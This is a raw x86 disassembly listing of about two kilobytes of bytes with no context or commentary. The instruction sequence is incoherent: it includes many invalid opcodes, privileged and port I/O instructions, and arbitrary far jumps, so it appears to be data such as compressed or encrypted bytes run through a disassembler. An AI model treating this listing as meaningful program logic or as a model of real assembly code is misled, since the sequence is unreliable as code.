  41564e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41564f:	jle    0x41568e
  415651:	mov    ch,BYTE PTR ds:0xabb20e9c
  415657:	sbb    ch,bh
  415659:	ret    0x5c48
  41565c:	mov    al,ds:0xc9e7f5a8
  415661:	xchg   esp,eax
  415662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415663:	push   0xd7397a39
  415668:	stos   DWORD PTR es:[edi],eax
  415669:	sbb    DWORD PTR [eax+0x2a],esi
  41566c:	cmp    BYTE PTR [eax-0x150e1360],0x1f
  415673:	fild   DWORD PTR [ebx]
  415675:	fdivr  st,st(5)
  415677:	adc    eax,0xe358fb07
  41567c:	mov    edi,0xe8f8528c
  415681:	sahf   
  415682:	test   eax,0x9455d18
  415687:	push   cs
  415688:	(bad)  
  415689:	xchg   edx,eax
  41568a:	push   esi
  41568b:	push   es
  41568c:	inc    ebx
  41568d:	stos   BYTE PTR es:[edi],al
  41568e:	cld    
  41568f:	test   eax,0xbbd03bf6
  415694:	jb     0x4156df
  415696:	aaa    
  415697:	test   al,0x8c
  415699:	shr    DWORD PTR [ebp-0x16dd6b40],1
  41569f:	pop    ss
  4156a0:	push   eax
  4156a1:	or     ch,al
  4156a3:	jmp    0x6df8c072
  4156a8:	xchg   ecx,eax
  4156a9:	sbb    ebp,edi
  4156ab:	jb     0x4156c4
  4156ad:	mov    dh,0x87
  4156af:	sbb    bl,bh
  4156b1:	int3   
  4156b2:	mov    dl,0xdf
  4156b4:	dec    ecx
  4156b5:	xchg   ebx,eax
  4156b6:	ss xor eax,0x317514cc
  4156bc:	inc    ebp
  4156bd:	xor    dh,bh
  4156bf:	xchg   ecx,eax
  4156c0:	shl    DWORD PTR [esi],1
  4156c2:	fsub   DWORD PTR [ebp+0x5996eca8]
  4156c8:	call   0xe4d:0x642a756b
  4156cf:	xor    eax,0xc1391e91
  4156d4:	xor    ah,bl
  4156d6:	or     esp,eax
  4156d8:	stc    
  4156d9:	cs push ss
  4156db:	dec    esp
  4156dc:	es dec ecx
  4156de:	sub    al,0x8a
  4156e0:	push   eax
  4156e1:	push   ebp
  4156e2:	xchg   edi,eax
  4156e3:	cld    
  4156e4:	adc    BYTE PTR [eax],dh
  4156e6:	nop
  4156e7:	mov    BYTE PTR [ecx+ebp*1+0x71],bh
  4156eb:	mov    bl,bh
  4156ed:	out    dx,al
  4156ee:	jmp    0x44a6:0xaa23b273
  4156f5:	cmp    BYTE PTR ds:0x651ba4f6,0x7c
  4156fc:	cmp    al,0x11
  4156fe:	xchg   esp,eax
  4156ff:	pop    ecx
  415700:	into   
  415701:	sbb    al,0xe2
  415703:	add    al,ch
  415705:	cmp    eax,0x45c7f153
  41570a:	mov    esi,DWORD PTR [ecx-0x454992bf]
  415710:	inc    eax
  415711:	dec    ebp
  415712:	out    0x28,al
  415714:	or     DWORD PTR [edi+0x36],esp
  415717:	sar    ecx,1
  415719:	addr16 pop es
  41571b:	or     al,0xf6
  41571d:	push   cs
  41571e:	xchg   edi,eax
  41571f:	dec    ecx
  415720:	sub    BYTE PTR ds:0x52f4caf0,dh
  415726:	or     DWORD PTR [ebx+0x63],esp
  415729:	push   es
  41572a:	jnp    0x4156b1
  41572c:	cmc    
  41572d:	shl    BYTE PTR [eax],0xc0
  415730:	jmp    0x4156bc
  415732:	add    al,0xae
  415734:	xchg   ebp,eax
  415735:	push   edx
  415736:	int    0x35
  415738:	fucomi st,st(3)
  41573a:	mov    BYTE PTR [eax],dl
  41573c:	leave  
  41573d:	icebp  
  41573e:	adc    eax,0xd1c0fb51
  415743:	inc    ebp
  415744:	jno    0x415749
  415746:	mov    esp,0x456aec19
  41574b:	out    dx,al
  41574c:	xor    bh,BYTE PTR [eax]
  41574e:	inc    ecx
  41574f:	fwait
  415750:	mov    ah,0xa3
  415752:	sbb    edx,DWORD PTR [edi]
  415754:	dec    ebx
  415755:	in     eax,0xd
  415757:	popa   
  415758:	fadd   QWORD PTR [ebp+0x5363f190]
  41575e:	out    0xf2,eax
  415760:	cmp    eax,0x3fe619ed
  415765:	mov    ch,ah
  415767:	sbb    BYTE PTR [edx],dl
  415769:	les    ebp,FWORD PTR [ecx-0x12]
  41576c:	jo     0x4157c2
  41576e:	nop
  41576f:	xchg   edx,eax
  415770:	jb     0x4157ba
  415772:	imul   esi,DWORD PTR [ebx],0xffffff87
  415775:	lea    eax,[ecx-0x1b]
  415778:	rcr    DWORD PTR [ebp+0xa],1
  41577b:	sti    
  41577c:	add    DWORD PTR [eax-0x48],ebx
  41577f:	mov    BYTE PTR [ebx+0x49],bh
  415782:	push   ss
  415783:	adc    DWORD PTR [eax+0x53],ebx
  415786:	out    0xd9,al
  415788:	jbe    0x415790
  41578a:	ror    DWORD PTR [edx+0x67843b0d],cl
  415790:	cs jp  0x415784
  415793:	pop    es
  415794:	pop    esp
  415795:	hlt    
  415796:	jmp    0x547eb321
  41579b:	pop    esp
  41579c:	rol    cl,cl
  41579e:	pop    esi
  41579f:	mov    dh,0xb0
  4157a1:	iret   
  4157a2:	mov    edi,esi
  4157a4:	scas   al,BYTE PTR es:[edi]
  4157a5:	xor    eax,0x43966831
  4157aa:	or     al,BYTE PTR [esi]
  4157ac:	jl     0x41582d
  4157ae:	cmp    eax,0x5943fadd
  4157b3:	pop    ds
  4157b4:	pop    edi
  4157b5:	and    bh,BYTE PTR [ecx-0xd5e2723]
  4157bb:	(bad)  
  4157bc:	gs iret 
  4157be:	mov    cl,0x29
  4157c0:	ds jecxz 0x415789
  4157c3:	sbb    ebx,DWORD PTR [edx]
  4157c5:	adc    esp,DWORD PTR [ecx-0x57]
  4157c8:	sub    ah,al
  4157ca:	fwait
  4157cb:	xchg   ebp,eax
  4157cc:	bound  esp,QWORD PTR [ebp+0xd]
  4157cf:	rsm    
  4157d1:	adc    DWORD PTR [esi-0x34],0xa33a9724
  4157d8:	dec    ebp
  4157d9:	(bad)  
  4157db:	push   edi
  4157dc:	arpl   WORD PTR [ecx+0x4aa415a0],bx
  4157e2:	xchg   esp,eax
  4157e3:	jno    0x415859
  4157e5:	dec    edx
  4157e6:	xor    eax,0xe227dd88
  4157eb:	or     eax,0x8fd00950
  4157f0:	not    DWORD PTR [esi+0x442480c4]
  4157f6:	pop    eax
  4157f7:	pop    ebx
  4157f8:	fisttp DWORD PTR [eax+esi*8]
  4157fb:	pop    ss
  4157fc:	cmp    al,BYTE PTR [esi-0x624c2ebb]
  415802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415803:	test   al,0x52
  415805:	xchg   ebp,eax
  415806:	repz fsubr DWORD PTR [eax-0x7]
  41580a:	gs leave 
  41580c:	pop    es
  41580d:	cmp    eax,0xb9cff6ad
  415812:	popa   
  415813:	iret   
  415814:	ins    BYTE PTR es:[edi],dx
  415815:	mov    ds:0x9462b0ac,al
  41581a:	xor    DWORD PTR [ebp+0x30],ecx
  41581d:	inc    eax
  41581e:	fild   QWORD PTR [esi+0x35cb00e8]
  415824:	bound  eax,QWORD PTR [edx+ebp*1-0x60]
  415828:	sti    
  415829:	js     0x4157d4
  41582b:	inc    ecx
  41582c:	or     bl,BYTE PTR [edi]
  41582e:	stos   DWORD PTR es:[edi],eax
  41582f:	daa    
  415830:	test   DWORD PTR [edx],edi
  415832:	cmp    eax,0xcc05e2a1
  415837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415838:	xchg   esp,eax
  415839:	stos   BYTE PTR es:[edi],al
  41583a:	sbb    eax,0x96b09081
  41583f:	aas    
  415840:	scas   al,BYTE PTR es:[edi]
  415841:	xchg   edi,eax
  415842:	fisubr WORD PTR [edi+0x7c]
  415845:	jns    0x415896
  415847:	sub    BYTE PTR [edx],bh
  415849:	jge    0x4158b9
  41584b:	add    eax,0x92e2c741
  415850:	or     esi,DWORD PTR [edx]
  415852:	outs   dx,DWORD PTR ds:[esi]
  415853:	xchg   edx,eax
  415854:	out    dx,al
  415855:	or     eax,0x1ad04a17
  41585a:	mov    cl,0x74
  41585c:	stc    
  41585d:	ficom  WORD PTR [edx+0x67]
  415860:	pop    esp
  415861:	adc    DWORD PTR [eax],eax
  415863:	add    BYTE PTR [esi],al
  415865:	and    eax,0x3be5cd57
  41586a:	jg     0x41586a
  41586c:	adc    BYTE PTR [ebx-0x744375f1],bl
  415872:	sub    BYTE PTR [edi],al
  415874:	aad    0xe3
  415876:	fucomi st,st(7)
  415878:	push   esi
  415879:	sbb    dh,ah
  41587b:	adc    al,0xa8
  41587d:	push   es
  41587e:	dec    ebx
  41587f:	ds jo  0x41582f
  415882:	fldenv [eiz*8-0x2bfd3a01]
  415889:	dec    ecx
  41588a:	push   esp
  41588b:	adc    cl,BYTE PTR [ebp+0x3]
  41588e:	dec    ebp
  41588f:	mov    ebx,ebx
  415891:	mov    WORD PTR [esi-0x2b3db901],es
  415897:	aam    0xa5
  415899:	mov    bl,BYTE PTR fs:0xfd8cb49b
  4158a0:	in     eax,0xd3
  4158a2:	sbb    al,0xf9
  4158a4:	aad    0xe5
  4158a6:	push   cs
  4158a7:	fisub  DWORD PTR [edi]
  4158a9:	ret    0xdb85
  4158ac:	mov    ds:0x9a7ffb5a,eax
  4158b1:	mov    esp,0x4214431
  4158b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b7:	and    bh,BYTE PTR ds:0xe7de855e
  4158bd:	dec    edi
  4158be:	xchg   esp,eax
  4158bf:	pop    edx
  4158c0:	(bad)  
  4158c3:	push   eax
  4158c4:	sub    ah,ah
  4158c6:	inc    edx
  4158c7:	stos   DWORD PTR es:[edi],eax
  4158c8:	push   edi
  4158c9:	jb     0x4158da
  4158cb:	xlat   BYTE PTR ds:[ebx]
  4158cc:	into   
  4158cd:	xchg   DWORD PTR [esi],ecx
  4158cf:	sbb    al,0xc7
  4158d1:	pop    ecx
  4158d2:	shr    dh,0xa4
  4158d5:	push   0xffffffb2
  4158d7:	jg     0x415932
  4158d9:	cmp    BYTE PTR [edi+ebp*4],0xb5
  4158dd:	retf   
  4158de:	int    0xdf
  4158e0:	lahf   
  4158e1:	(bad)  
  4158e2:	clc    
  4158e3:	into   
  4158e4:	mov    edx,0x24eb30ac
  4158e9:	sub    cl,BYTE PTR [ecx+edx*2+0x2d97264f]
  4158f0:	shr    BYTE PTR [ebx],0x9f
  4158f3:	mov    cl,0xb8
  4158f6:	sbb    al,0x3c
  4158f8:	retf   
  4158f9:	adc    eax,0x37e2ba92
  4158fe:	js     0x4158f5
  415900:	sbb    eax,0xa1aa45f9
  415905:	and    eax,0xd0043a88
  41590a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41590b:	sbb    dh,cl
  41590d:	out    dx,al
  41590e:	rol    BYTE PTR [edi-0x4faba4dc],1
  415914:	inc    edi
  415915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415916:	mov    DWORD PTR [eax+0x5f49460a],ecx
  41591c:	push   cs
  41591d:	gs sub eax,0xcda5632c
  415923:	not    BYTE PTR [edi]
  415925:	stos   DWORD PTR es:[edi],eax
  415926:	sbb    bl,BYTE PTR [edi+0x7ba20787]
  41592c:	mov    dh,0xbf
  41592e:	int    0xde
  415930:	popf   
  415931:	mov    ebp,0x44dda8f7
  415936:	loop   0x4159a0
  415938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415939:	add    al,al
  41593b:	imul   ebp,edx,0x3
  41593e:	mov    eax,ds:0x11d0d1a0
  415943:	and    bl,BYTE PTR [ebx-0x70]
  415946:	mov    bl,0x16
  415948:	shl    dl,cl
  41594a:	xor    DWORD PTR [edx],eax
  41594c:	out    0x13,eax
  41594e:	dec    esp
  41594f:	xor    DWORD PTR [edi],esp
  415951:	pushf  
  415952:	fistp  WORD PTR [ebp+0x3bf9620]
  415958:	fnstenv [ebp-0x31f73b47]
  41595e:	inc    esp
  41595f:	pop    esp
  415960:	call   0xc8192920
  415965:	fs stc 
  415967:	jmp    0xfcb5:0xd50b1584
  41596e:	retf   0x92c5
  415971:	push   ds
  415972:	mov    ebx,0x3469d4a3
  415977:	xchg   esp,eax
  415978:	pop    ss
  415979:	jne    0x4159f7
  41597b:	jp     0x415916
  41597d:	add    cl,BYTE PTR [ecx+ebp*4]
  415980:	das    
  415981:	cmp    DWORD PTR [edi],0x11
  415984:	or     edi,DWORD PTR [esi]
  415986:	test   eax,0xe8336e85
  41598b:	jp     0x41598e
  41598d:	or     BYTE PTR [ebx],dh
  41598f:	xchg   BYTE PTR [eax+edi*2+0x1e1112a5],bl
  415996:	push   ss
  415997:	jns    0x415968
  415999:	push   ebx
  41599a:	mov    bh,0xc7
  41599c:	adc    bl,BYTE PTR [edx+eax*1-0x33]
  4159a0:	sahf   
  4159a1:	frstor [edi+0x42a83fe8]
  4159a7:	push   ebx
  4159a8:	lods   al,BYTE PTR ds:[esi]
  4159a9:	jb     0x415a16
  4159ab:	xor    ebp,DWORD PTR [ebp-0x3e]
  4159ae:	aam    0xa7
  4159b0:	loopne 0x4159b2
  4159b2:	mov    BYTE PTR [eax],dh
  4159b4:	mov    es,ecx
  4159b6:	xchg   DWORD PTR [ebx],edx
  4159b8:	or     DWORD PTR [edi+0x25],eax
  4159bb:	aam    0x25
  4159bd:	mov    edi,0x96e30585
  4159c2:	or     ebp,DWORD PTR [esp+eax*1+0x5c]
  4159c6:	popa   
  4159c7:	fwait
  4159c8:	xchg   ecx,eax
  4159c9:	div    BYTE PTR [edi+edx*4+0x6dcd71d6]
  4159d0:	out    0x90,al
  4159d2:	adc    DWORD PTR [edi+eax*8],edi
  4159d5:	or     eax,0xf85065dc
  4159da:	jg     0x415979
  4159dc:	fcmovb st,st(2)
  4159de:	lods   eax,DWORD PTR ds:[esi]
  4159df:	sub    DWORD PTR [esi],ecx
  4159e1:	xor    ah,BYTE PTR [edx+0x5a]
  4159e4:	daa    
  4159e5:	pusha  
  4159e6:	xor    al,0x30
  4159e8:	mov    bh,0x45
  4159ea:	mov    ebp,0x87322c70
  4159ef:	retf   
  4159f0:	jge    0x4159f9
  4159f2:	cmp    al,0xec
  4159f4:	out    0x75,al
  4159f6:	sub    al,0x21
  4159f8:	popf   
  4159f9:	and    eax,0xc77a306e
  4159fe:	mov    ds:0x57053792,eax
  415a03:	cmp    DWORD PTR [esi],ecx
  415a05:	adc    bl,BYTE PTR [edx-0x3cdf5466]
  415a0b:	outs   dx,DWORD PTR ds:[esi]
  415a0c:	outs   dx,BYTE PTR ds:[esi]
  415a0d:	jmp    0xf02c:0x2bca8312
  415a14:	jnp    0x415a50
  415a16:	pusha  
  415a17:	neg    DWORD PTR gs:[edi+0x3d]
  415a1b:	add    DWORD PTR [edx-0x10],ebp
  415a1e:	pop    ebp
  415a1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a20:	add    DWORD PTR [esp+eiz*4+0x24e68d65],esp
  415a27:	icebp  
  415a28:	jno    0x4159ac
  415a2a:	xchg   esp,eax
  415a2b:	popw   es
  415a2d:	inc    ebp
  415a2e:	or     BYTE PTR [esi-0x43d57b24],0xc2
  415a35:	add    dl,BYTE PTR [ecx-0x598d9fee]
  415a3b:	cmp    al,0xf0
  415a3d:	pop    es
  415a3e:	call   0x1263:0xde5d5440
  415a45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a46:	mov    ss,WORD PTR [ebx]
  415a48:	jne    0x415a7e
  415a4a:	xchg   edi,eax
  415a4b:	adc    eax,0xed33f6bf
  415a50:	lock mov dh,0x68
  415a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a54:	pushw  es
  415a56:	leave  
  415a57:	lock cmp al,0x69
  415a5a:	in     eax,dx
  415a5b:	adc    eax,0xb19ca4b
  415a60:	ffree  st(1)
  415a62:	outs   dx,DWORD PTR ds:[esi]
  415a63:	xchg   ebx,ecx
  415a65:	frstor [edi]
  415a67:	pop    edi
  415a68:	xor    eax,0x70367379
  415a6d:	lds    ebx,FWORD PTR [ecx]
  415a6f:	xchg   ebx,eax
  415a70:	test   DWORD PTR [edx],edi
  415a72:	lods   al,BYTE PTR ds:[esi]
  415a73:	lahf   
  415a74:	or     eax,DWORD PTR [ebx]
  415a76:	rcl    BYTE PTR [edi],1
  415a78:	mov    ds:0x8a6798c,eax
  415a7d:	xchg   ebx,eax
  415a7e:	adc    al,0x6a
  415a80:	(bad)  
  415a83:	mov    ecx,0xbab43d1
  415a88:	fdivr  QWORD PTR [edi-0x36]
  415a8b:	cwde   
  415a8c:	aas    
  415a8d:	or     esi,DWORD PTR [ecx+0x2ad372a2]
  415a93:	mov    eax,0x141a111f
  415a98:	stc    
  415a99:	test   BYTE PTR [ecx],ah
  415a9b:	int3   
  415a9c:	call   0xe934:0x9f6c2355
  415aa3:	mov    eax,ds:0xe191aa5b
  415aa8:	jl     0x415b0e
  415aaa:	(bad)  
  415aab:	aad    0xa
  415aad:	jae    0x415a8d
  415aaf:	push   eax
  415ab0:	test   eax,0x33f5fb70
  415ab5:	mov    ds:0xd1e01a5,eax
  415aba:	inc    ecx
  415abb:	and    al,0x6b
  415abd:	fnstsw WORD PTR [ecx-0xd]
  415ac0:	mov    eax,0xf66a87c
  415ac5:	push   es
  415ac6:	sbb    ecx,DWORD PTR [ebp+0x64]
  415ac9:	leave  
  415aca:	inc    esi
  415acb:	pop    es
  415acc:	add    eax,0x18803488
  415ad1:	pop    esp
  415ad2:	mov    ebp,0x2028eae8
  415ad7:	mov    al,ds:0x836ceec3
  415adc:	push   0xe7cf0370
  415ae1:	jne    0x415b10
  415ae3:	pop    ebp
  415ae4:	and    al,0xce
  415ae6:	dec    ebp
  415ae7:	xchg   edi,eax
  415ae8:	xchg   edi,eax
  415ae9:	(bad)  
  415aea:	rcl    BYTE PTR [eax+0x5c],1
  415aed:	fimul  DWORD PTR [edx-0x5b]
  415af0:	mov    WORD PTR [ebx],fs
  415af2:	mov    cl,0x70
  415af4:	or     ebp,esi
  415af6:	push   ds
  415af7:	pop    edi
  415af8:	add    eax,0xb5434f38
  415afd:	push   es
  415afe:	aaa    
  415aff:	gs pop ds
  415b01:	mov    ch,0x5
  415b03:	cwde   
  415b04:	mov    eax,ds:0x7415447a
  415b09:	add    eax,0xc0fdb929
  415b0e:	loopne 0x415aee
  415b10:	cmp    DWORD PTR [ecx+0xa],0xfffffff5
  415b14:	mov    ebp,DWORD PTR [ebp+0x65]
  415b17:	mov    WORD PTR [edi],?
  415b19:	stos   DWORD PTR es:[edi],eax
  415b1a:	data16 adc al,0x12
  415b1e:	lods   al,BYTE PTR ds:[esi]
  415b1f:	sub    eax,0xd6653081
  415b24:	xor    eax,0xb07ee2c5
  415b29:	cmp    eax,0x89cef16b
  415b2e:	adc    ebx,DWORD PTR [ebp+esi*1-0x5c91993e]
  415b35:	cmc    
  415b36:	in     eax,0xe3
  415b38:	xchg   cl,dh
  415b3a:	cs aam 0xf0
  415b3d:	popf   
  415b3e:	loopne 0x415b41
  415b40:	mov    bh,0xa3
  415b42:	out    dx,eax
  415b43:	test   BYTE PTR [edi],dl
  415b45:	or     al,BYTE PTR [esi-0x5d]
  415b48:	cmp    esp,DWORD PTR [edx]
  415b4a:	outs   dx,DWORD PTR ds:[esi]
  415b4b:	mov    BYTE PTR [edx+0x14],dl
  415b4e:	inc    ecx
  415b4f:	sbb    DWORD PTR [ecx],ebx
  415b51:	aaa    
  415b52:	mov    al,0x81
  415b54:	pop    eax
  415b55:	xor    DWORD PTR [ebp-0x20],0xffffffd5
  415b59:	fmul   DWORD PTR [edx]
  415b5b:	loopne 0x415aff
  415b5d:	imul   esi,DWORD PTR [esi],0xffffffb6
  415b60:	fmul   QWORD PTR [edx]
  415b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b63:	out    0xa,eax
  415b65:	adc    DWORD PTR [edx-0xb24d586],edi
  415b6b:	push   ebx
  415b6c:	stos   DWORD PTR es:[edi],eax
  415b6d:	inc    edi
  415b6e:	dec    ecx
  415b6f:	(bad)  
  415b70:	fdiv   DWORD PTR [ebp-0x380702d4]
  415b76:	fwait
  415b77:	lods   al,BYTE PTR ds:[esi]
  415b78:	sub    eax,0x390cbcd7
  415b7d:	push   es
  415b7e:	push   ss
  415b7f:	aas    
  415b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b81:	dec    eax
  415b82:	sbb    eax,0x8affcddd
  415b87:	jno    0x415b1b
  415b89:	(bad)  [edi+0x13]
  415b8c:	inc    eax
  415b8d:	les    edx,FWORD PTR [ebx]
  415b8f:	jecxz  0x415bf9
  415b91:	int3   
  415b92:	fiadd  DWORD PTR [ebx]
  415b94:	aaa    
  415b95:	jl     0x415b1f
  415b97:	ret    
  415b98:	adc    DWORD PTR [eax-0x1d],eax
  415b9b:	inc    eax
  415b9c:	adc    BYTE PTR [ebp+0xa51d29d],ah
  415ba2:	loope  0x415bd5
  415ba4:	xor    eax,DWORD PTR [edi+0x6785a0ba]
  415baa:	mov    edi,0x332154a0
  415baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb0:	imul   esp,DWORD PTR [edx+0x45],0xa973f7b8
  415bb7:	dec    ecx
  415bb8:	adc    al,0xb9
  415bba:	cwde   
  415bbb:	outs   dx,DWORD PTR ds:[esi]
  415bbc:	out    dx,al
  415bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bbe:	cli    
  415bbf:	dec    esp
  415bc0:	fabs   
  415bc2:	sbb    esp,ecx
  415bc4:	adc    eax,0xc74a05db
  415bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bca:	mov    dl,0x93
  415bcc:	pushf  
  415bcd:	pushf  
  415bce:	in     eax,dx
  415bcf:	xchg   ebx,eax
  415bd0:	jbe    0x415c4e
  415bd2:	stos   BYTE PTR es:[edi],al
  415bd3:	es (bad) 
  415bd5:	in     al,0x83
  415bd7:	inc    ebx
  415bd8:	pop    esp
  415bd9:	daa    
  415bda:	xor    edi,DWORD PTR [esi-0x21]
  415bdd:	pop    ds
  415bde:	int    0xe5
  415be0:	xlat   BYTE PTR ds:[ebx]
  415be1:	mov    cl,0xac
  415be3:	fst    st(0)
  415be5:	cli    
  415be6:	fistp  WORD PTR [edx+0x41]
  415be9:	or     al,0xbb
  415beb:	sahf   
  415bec:	mov    ecx,0x53d568a
  415bf1:	aad    0xd2
  415bf3:	add    BYTE PTR [eax],bh
  415bf5:	xchg   ecx,eax
  415bf6:	mov    al,0xdc
  415bf8:	mov    esi,0x404d1c85
  415bfd:	sar    DWORD PTR [ebp-0x49f8fc1c],cl
  415c03:	ror    DWORD PTR [edi+edx*4-0x2e4e6426],cl
  415c0a:	jg     0x415c4a
  415c0c:	ins    DWORD PTR es:[edi],dx
  415c0d:	mov    eax,ds:0xd706f7a9
  415c12:	lds    edi,FWORD PTR [esi]
  415c14:	jb     0x415c4f
  415c16:	in     al,dx
  415c17:	or     ecx,DWORD PTR [edi+0x2f7bc142]
  415c1d:	test   eax,0xb3e2f395
  415c22:	adc    BYTE PTR [esi+0x70fc22dd],dl
  415c28:	pop    ds
  415c29:	mov    ch,0x6a
  415c2b:	dec    edi
  415c2c:	add    BYTE PTR [ebp-0x5d50a8b3],bh
  415c32:	popa   
  415c33:	loop   0x415c72
  415c35:	jnp    0x415c13
  415c37:	adc    DWORD PTR [eax+0x267b61ea],0x447874e9
  415c41:	leave  
  415c42:	or     DWORD PTR [edx-0x398b1eab],ebx
  415c48:	lods   al,BYTE PTR ds:[esi]
  415c49:	(bad)  
  415c4a:	mov    edx,0xc68747ed
  415c4f:	pop    esi
  415c50:	xlat   BYTE PTR ds:[ebx]
  415c51:	sub    DWORD PTR [edi],esp
  415c53:	cmp    ebp,edi
  415c55:	mov    dl,0x3f
  415c57:	push   ebx
  415c58:	ret    
  415c59:	mov    al,ds:0xe6226dd9
  415c5e:	cmp    BYTE PTR [ebx],ah
  415c60:	push   eax
  415c61:	mov    eax,ds:0x3eefa1bf
  415c66:	jnp    0x415c00
  415c68:	stc    
  415c69:	outs   dx,DWORD PTR ds:[esi]
  415c6a:	sub    al,0xfb
  415c6c:	test   DWORD PTR [eax+0x68],0xb5b82982
  415c73:	or     BYTE PTR [ebp-0x2a],dl
  415c76:	push   0xffffffae
  415c78:	pop    edx
  415c79:	repz cmc 
  415c7b:	sub    DWORD PTR [ebp+0x770fbb79],edi
  415c81:	mov    eax,0x26cdcf52
  415c86:	sub    edi,DWORD PTR [ebp+0x767cd299]
  415c8c:	inc    edx
  415c8d:	pop    ds
  415c8e:	mov    cl,0x23
  415c90:	and    eax,0x730cb759
  415c95:	or     al,0x31
  415c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c98:	sbb    DWORD PTR [edi+eax*2+0x46],ecx
  415c9c:	jbe    0x415c98
  415c9e:	fisubr DWORD PTR [edi]
  415ca0:	mov    ah,0xd1
  415ca2:	inc    edi
  415ca3:	push   0x5d
  415ca5:	outs   dx,BYTE PTR ds:[esi]
  415ca6:	jae    0x415d0c
  415ca8:	xor    DWORD PTR [edx-0x11],esp
  415cab:	inc    ebx
  415cac:	scas   eax,DWORD PTR es:[edi]
  415cad:	aam    0xa8
  415caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb0:	cmp    ah,dh
  415cb2:	inc    eax
  415cb3:	pop    esp
  415cb4:	and    BYTE PTR [eax+0x68],ch
  415cb7:	cld    
  415cb8:	or     al,0x3
  415cba:	pop    ss
  415cbb:	xchg   esi,eax
  415cbc:	sbb    BYTE PTR [esi],bh
  415cbe:	adc    al,0xf4
  415cc0:	aaa    
  415cc1:	retf   0xa676
  415cc4:	(bad)  
  415cc5:	mov    dl,0xa4
  415cc7:	cs enter 0x8ea6,0x1d
  415ccc:	sbb    eax,0x480f5f9d
  415cd1:	aas    
  415cd2:	adc    edx,DWORD PTR [edx+esi*8+0x5e]
  415cd6:	sub    cl,BYTE PTR ds:0x85ac7771
  415cdc:	mov    BYTE PTR [eax+edi*2-0x154e20bc],bh
  415ce3:	scas   eax,DWORD PTR es:[edi]
  415ce4:	mov    cl,0x3d
  415ce6:	ins    BYTE PTR es:[edi],dx
  415ce7:	js     0x415cbe
  415ce9:	test   al,0xfa
  415ceb:	xor    ecx,ebx
  415ced:	outs   dx,BYTE PTR ds:[esi]
  415cee:	and    BYTE PTR [ebx+0x1c],cl
  415cf1:	leave  
  415cf2:	cs jne 0x415d46
  415cf5:	ficomp WORD PTR [edi-0x76]
  415cf8:	aas    
  415cf9:	ja     0x415c9e
  415cfb:	shr    ebx,cl
  415cfd:	mov    bh,ch
  415cff:	cs cmp al,bl
  415d02:	out    dx,al
  415d03:	jecxz  0x415d3d
  415d05:	(bad)  
  415d06:	in     eax,0xf3
  415d08:	jecxz  0x415d50
  415d0a:	add    BYTE PTR [edx+esi*2-0x15],0xe5
  415d0f:	adc    DWORD PTR [ebp+0x16beedd2],ecx
  415d15:	inc    edx
  415d16:	sbb    ah,BYTE PTR [edx-0x24]
  415d19:	mov    al,BYTE PTR [ebx-0x20]
  415d1c:	paddsw mm4,QWORD PTR [edi-0x1f]
  415d20:	retf   
  415d21:	sti    
  415d22:	ins    DWORD PTR es:[edi],dx
  415d23:	mov    dh,dh
  415d25:	stos   BYTE PTR es:[edi],al
  415d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d27:	push   ebx
  415d28:	mov    WORD PTR [edi-0x351b3ec3],fs
  415d2e:	xchg   edi,eax
  415d2f:	mov    dh,0xa6
  415d31:	scas   eax,DWORD PTR es:[edi]
  415d32:	cmp    BYTE PTR [edx],bh
  415d34:	sub    ecx,DWORD PTR [ecx-0xf910000]
  415d3a:	call   0xcab5:0x9b040ea7
  415d41:	mov    eax,ds:0x18c7ad5e
  415d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d47:	enter  0xacb6,0x11
  415d4b:	sbb    BYTE PTR [ecx],al
  415d4d:	das    
  415d4e:	xor    esp,DWORD PTR [ecx+0x14]
  415d51:	(bad)  
  415d52:	push   0x6c23ea1f
  415d57:	and    bl,BYTE PTR [ecx+0x76446c34]
  415d5d:	or     DWORD PTR [eax+edx*2-0x678ed209],esp
  415d64:	dec    ebx
  415d65:	fdiv   QWORD PTR [eax]
  415d67:	mov    ds:0xac24b4fc,eax
  415d6c:	ja     0x415d18
  415d6e:	push   edx
  415d6f:	jb     0x415d77
  415d71:	pop    edx
  415d72:	sbb    BYTE PTR [edi-0x1b0f4696],bl
  415d78:	pop    edi
  415d79:	mov    fs,edx
  415d7b:	dec    esi
  415d7c:	xchg   ebp,eax
  415d7d:	sub    ebp,esp
  415d7f:	or     edx,esp
  415d81:	outs   dx,DWORD PTR ds:[esi]
  415d82:	call   0x7a66ac4c
  415d87:	pushf  
  415d88:	shr    DWORD PTR [edx-0x47a64f64],0xf1
  415d8f:	xor    dl,dl
  415d91:	cmp    al,0x84
  415d93:	leave  
  415d94:	push   ds
  415d95:	stos   BYTE PTR es:[edi],al
  415d96:	mov    dh,0x10
  415d98:	sbb    BYTE PTR [eax],dh
  415d9a:	sub    edx,DWORD PTR [edi+0x76]
  415d9d:	stos   BYTE PTR es:[edi],al
  415d9e:	pop    esi
  415d9f:	push   0x3a
  415da1:	shl    BYTE PTR [esi],0x97
  415da4:	or     DWORD PTR [edx+0x20a47062],eax
  415daa:	cdq    
  415dab:	repnz dec ecx
  415dad:	ja     0x415da7
  415daf:	adc    ch,BYTE PTR [ecx-0x76484051]
  415db5:	mov    edx,0xe8386664
  415dba:	mov    esp,0x4fc31ef5
  415dbf:	xchg   ebp,eax
  415dc0:	cmc    
  415dc1:	ret    
  415dc2:	jae    0x415d72
